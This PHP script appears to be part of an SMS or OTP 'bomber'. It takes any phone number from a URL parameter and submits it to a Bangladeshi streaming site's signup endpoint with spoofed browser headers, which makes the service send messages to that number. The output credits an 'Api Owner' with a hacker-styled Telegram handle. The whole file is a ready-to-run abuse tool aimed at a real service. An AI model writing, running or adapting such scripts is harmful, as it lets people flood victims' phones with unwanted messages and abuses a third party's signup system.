<?php

// Get the phone number from the URL query string
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Format the phone number to ensure it's 11 digits and remove the leading "0"
$formattedPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
if (strlen($formattedPhone) === 11 && $formattedPhone[0] === '0') {
    // Remove the leading "0"
    $phoneToUse = substr($formattedPhone, 1);
} elseif (strlen($formattedPhone) === 10) {
    // If it’s already 10 digits, use it as is
    $phoneToUse = $formattedPhone;
} else {
    echo "Invalid phone number. Please provide an 11-digit phone number.";
    exit;
}

// Prepare the data for the POST request
$data = http_build_query([
    'msisdn-signup' => '880' . $phoneToUse, // Using 880 for Bangladeshi numbers
    'register-submit' => 'Sign Up'
]);

// Initialize cURL
$ch = curl_init('https://banglaflix.com.bd/signin/signupsubmit');

// Set the necessary options for cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
    'Cache-Control: max-age=0',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://banglaflix.com.bd',
    'Referer: https://banglaflix.com.bd/signin',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
]);

// Set the data to be sent in the POST request
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

// Execute the cURL request
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Output the success message
echo "Success Response: \n";
echo "Api Owner : Mɾ. Jҽɾɾყ 😈\n";
echo "Telegram : t.me/Mr_Jerry_Hacker\n";

?>
